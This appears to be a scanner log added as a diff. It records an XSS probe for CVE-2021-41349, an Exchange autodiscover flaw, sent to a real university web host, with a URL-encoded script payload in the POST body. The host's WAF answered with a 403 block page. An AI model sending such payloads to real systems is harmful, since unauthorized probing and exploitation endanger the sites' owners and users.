@@ -1,0 +1,25 @@
+[CVE-2021-41349] Dumped HTTP request for https://aaindex.app.unimelb.edu.au/autodiscover/autodiscover.json
+
+
+POST /autodiscover/autodiscover.json HTTP/1.1
+Host: aaindex.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 66
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+%3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1
+[CVE-2021-41349] Dumped HTTP response https://aaindex.app.unimelb.edu.au/autodiscover/autodiscover.json
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 836
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3138227=uWDkzJAWSCOf3vKQqcxwV+Vxk2gAAAAAQUIPAAAAAABlZnLyw6S46a8jfurXr9bV; expires=Thu, 06 Aug 2026 08:08:46 GMT; HttpOnly; path=/; Domain=.app.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_1540_3138227=aEFedMAkNg2svGxVQi5fFeVxk2gAAAAA8Z8fRuMOo6mUANnlBKs9lw==; path=/; Domain=.app.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 11-7255977-0 NNNY RT(1754493413604 12) q(0 0 0 -1) r(0 -1) B15(1,10037,1) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/armd-her-Maies-do-Lenouse-not-one-fast-a-distedi" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=11-7255977-0%20NNNY%20RT%281754493413604%2012%29%20q%280%200%200%20-1%29%20r%280%20-1%29%20B15%281%2c10037%2c1%29%20U24&incident_id=1540000460019835375-34243134401809291&edet=15&cinfo=01000000d68f&rpinfo=0&mth=POST" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 1540000460019835375-34243134401809291</iframe></body></html>
